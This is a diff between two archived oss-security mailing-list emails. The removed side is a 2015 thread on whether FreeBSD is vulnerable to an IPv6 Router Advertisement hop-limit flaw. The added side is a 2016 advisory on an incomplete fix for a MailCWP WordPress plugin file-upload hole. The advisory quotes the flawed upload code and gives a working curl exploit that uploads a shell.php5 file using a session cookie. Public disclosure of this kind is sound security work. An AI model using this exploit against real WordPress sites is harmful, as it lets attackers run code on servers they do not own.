@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1775" "Friday" "3" "April" "2015" "11:54:01" "+0200" "D.S. Ljungmark" "ljungmark@modio.se" "<CAO0vwOV33zHW=z4FDHq91yX5UHxnDKtXnzqzkYCrR+koxh1d9g@mail.gmail.com>" "61" "Re: [oss-security] CVE Request : IPv6 Hop limit lowering via RA messages" nil nil nil "4" "2015040309:54:01" "[oss-security] CVE Request : IPv6 Hop limit lowering via RA messages" (number mark "        ljungmark@mo Apr  3   61/1775  " thread-indent "\"Re: [oss-security] CVE Request : IPv6 Hop limit lowering via RA messages\"\n") "<942E0C08-E883-429E-9F27-22715C00B684@netgate.com>" ("<CAO0vwOXOPSGb8xWiutn+r+rXhSQc3SwC8-S2bkpRZuRAvDOyHw@mail.gmail.com>" "<CAF6rxgk6e1rT3prS3SS4FthshnVQdSrrE+bB65ps6Tx30UznAA@mail.gmail.com>" "<942E0C08-E883-429E-9F27-22715C00B684@netgate.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1704" "Tuesday" "8" "November" "2016" "05:40:55" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>" "52" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" nil nil nil "11" "2016110810:40:55" "[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100" (number mark "U       larry0@me.co Nov  8   52/1704  " thread-indent "\"[oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17938 invoked by uid 550); 3 Apr 2015 09:54:13 -0000
+Received: (qmail 7880 invoked by uid 550); 8 Nov 2016 10:41:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,96 +11,82 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 17918 invoked from network); 3 Apr 2015 09:54:12 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:date
-         :message-id:subject:from:to:cc:content-type
-         :content-transfer-encoding;
-        bh=KTF0xwZrEgIVvNeHlB9fXgiEmVevYWiW//A3lq9kU2U=;
-        b=gZMsneNb0Kgdgg9ttZHyITnjiubrt+h92r01Zk5xyCZMg+qKdTrjPxqE9q9aMxVrlh
-         Lr8drI/Aq0UGcfd0fBGwmA0uvpBT3uiACtbJFlraa9u9FKoBdX0SSFROJeXD3Xt9vWYJ
-         xMT8yonRDpCbu7ZFBnaYC4aTHpxowmEBdVIkNmyI9WqbIPX0AqG/RMn3oQEHEiO9g6uR
-         63u6BJj8ijr1e74FrWzSEMClpGCBUNOC6vJGQ/y/NQp+C3ksToU2WK+xNsI/8/470C1Y
-         5DPrNXznS0OfNMpkbLtI15XhWt0TrbwlENlwVfJ+hJieW8sMZGwzBOYEINr7gX9xF6ud
-         6r/g==
-X-Gm-Message-State: ALoCoQmrUY8aXarN+Jy578OY4WUsubj5LGp7Ndenr0uvnsC7sH+DVTyqrxhDmFdOwblf05iAHLGW
-MIME-Version: 1.0
-X-Received: by 10.182.125.130 with SMTP id mq2mr2036134obb.52.1428054841071;
- Fri, 03 Apr 2015 02:54:01 -0700 (PDT)
-In-Reply-To: <942E0C08-E883-429E-9F27-22715C00B684@netgate.com>
-References: <CAO0vwOXOPSGb8xWiutn+r+rXhSQc3SwC8-S2bkpRZuRAvDOyHw@mail.gmail.com>
-	<CAF6rxgk6e1rT3prS3SS4FthshnVQdSrrE+bB65ps6Tx30UznAA@mail.gmail.com>
-	<942E0C08-E883-429E-9F27-22715C00B684@netgate.com>
-Message-ID: <CAO0vwOV33zHW=z4FDHq91yX5UHxnDKtXnzqzkYCrR+koxh1d9g@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Cc: Eitan Adler <lists@eitanadler.com>, FreeBSD Security Team <secteam@freebsd.org>, 
-	"freebsd-net@freebsd.org" <net@freebsd.org>, oss-security@lists.openwall.com
-Date: Fri, 3 Apr 2015 11:54:01 +0200
-From: "D.S. Ljungmark" <ljungmark@modio.se>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] CVE Request : IPv6 Hop limit lowering via RA messages
-To: Jim Thompson <jim@netgate.com>
+Received: (qmail 7862 invoked from network); 8 Nov 2016 10:41:10 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1478601658; bh=EBEaIsXPaEBU/n9LgNB/nSRUCsXHESF8gEyxZuRdti0=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=GVmjaIdSUytc23zO7CqXi4SElUFes+jjAMHQaljkJnpz0Gnu4t63Os2DvnSJmb/7e
+ chRFqSeeDSnLwAzhpcWRQG4UmBs+WnVWpjD7gTU+mslG989hMhH/1YcLUGWuN6v1nA
+ F+t8ndXZxCiavpQeDEkkzzXntCqvqmjCJhUoYhYPS8AgnNNgSfxfkIm/5OV+VvHPhs
+ fJ+eW3Zvp5UtJIRelcU677vWoYDqLy26j3MZy7psi+Br1SBnDQtGNr8bjFhIV3hthL
+ xUfzTG/c8i3XTEIAUoVYJkDRZF1s2qMKMZEj2PCa5uA6ThCkzvDTUolfB/Jemtb9G3
+ 6LuNbNE4voySw==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-11-08_03:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1603290000 definitions=main-1611080197
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>
+Date: Tue, 08 Nov 2016 05:40:55 -0500
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Subject: [oss-security] Mailcwp remote file upload vulnerability incomplete fix v1.100
 
-On Fri, Apr 3, 2015 at 6:06 AM, Jim Thompson <jim@netgate.com> wrote:
-> have you considered that there might not be a relevant patch because Free=
-BSD=E2=80=99s implementation isn=E2=80=99t affected?
+Title: Mailcwp remote file upload vulnerability incomplete fix v1.100
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-11-01
+Download Site: https://wordpress.org/plugins/mailcwp/
+Vendor: CadreWorks Pty Ltd
+Vendor Notified: 2016-11-01
+Vendor Contact: plugins@wordpress.org
+Description: MailCWP, Mail Client for WordPress. A full-featured mail clien=
+t plugin providing webmail access through your WordPress blog or website.
+Vulnerability:
+I noticed CVE-2015-1000000 wasn't fixed correctly, _any_ authenticated user=
+ can upload a file to the WordPress installation, they can get .php code ex=
+ecution by changing the extension to .php[3-5], .pht or .phtml.
 
-sys/netinet6/nd6_rtr.c
+My previous advisory:
 
-    300         if (nd_ra->nd_ra_curhoplimit)
-    301                 ndi->chlim =3D nd_ra->nd_ra_curhoplimit;
-
-The only "OUT" in that function I see are tests for:
-  Not accepting RA
-  hoplimit on current packet !=3D 255
-  not link-local
-  No extended ipv6 header
-
-
-Based on previous testing ( early March 2015), and reading of the
-source, I say that FreeBSD is vulnerable.
-
-
-Regards,
-  D.S. Ljungmark
+http://www.vapidlabs.com/advisory.php?v=3D138
 
 
->
-> Jim
->
->> On Apr 2, 2015, at 9:15 PM, Eitan Adler <lists@eitanadler.com> wrote:
->>
->> + FreeBSD lists since I haven't seen any relevant patches (although I
->> might have missed them).
->>
->> ---------- Forwarded message ----------
->> From: D.S. Ljungmark <ljungmark@modio.se>
->> Date: 2 April 2015 at 10:19
->> Subject: [oss-security] CVE Request : IPv6 Hop limit lowering via RA mes=
-sages
->> To: oss-security@lists.openwall.com
->>
->>
->> An unprivileged user on a local network can use IPv6 Neighbour
->> Discovery ICMP to broadcast a non-route with a low hop limit, this
->> causing machines to lower the hop limit on existing IPv6 routes.
->>
->> Linux Patch: http://www.spinics.net/lists/netdev/msg322361.html
->> Redhat bugzilla: https://bugzilla.redhat.com/show_bug.cgi?id=3D1203712
->>
->> Projects impacted:  Linux kernel,  NetworkManager, FreeBSD Kernel
->>
->>
->> Regards,
->>  D.S. Ljungmark
->>
->>
->> --
->> Eitan Adler
->> _______________________________________________
->> freebsd-net@freebsd.org mailing list
->> http://lists.freebsd.org/mailman/listinfo/freebsd-net
->> To unsubscribe, send any mail to "freebsd-net-unsubscribe@freebsd.org"
->
+require_once "../../../wp-load.php";
+
+if (!is_user_logged_in()) {
+  die('{"ERROR": -1}');
+}
+
+$message_id =3D $_REQUEST["message_id"];
+$upload_dir =3D $_REQUEST["upload_dir"];
+if (empty($_FILES) || $_FILES["file"]["error"]) {
+  die('{"OK": 0}');
+}
+=20
+$fileName =3D $_FILES["file"]["name"];
+$ext =3D pathinfo($fileName, PATHINFO_EXTENSION);
+if ($ext =3D=3D 'php') {
+  die('{"ERROR": -2}');
+}
+move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$f=
+ileName");
+=20
+die('{"OK": 1}');
+
+CVE-2016-1000156
+Exploit Code:
+	=E2=80=A2 Create any type of user and copy the contents of your cookie fil=
+e for curl:
+	=E2=80=A2=20=20
+	=E2=80=A2 $ curl   -F "file=3D@/home/larry/shell.php5" "http://example.com=
+/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=3D1" -F "upload_d=
+ir=3D/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt=20
+	=E2=80=A2 {"OK": 1}
+Advisory: www.vapidlabs.com/advisory.php?v=3D175
+Notes: Incomplete fix for CVE-2015-1000000=
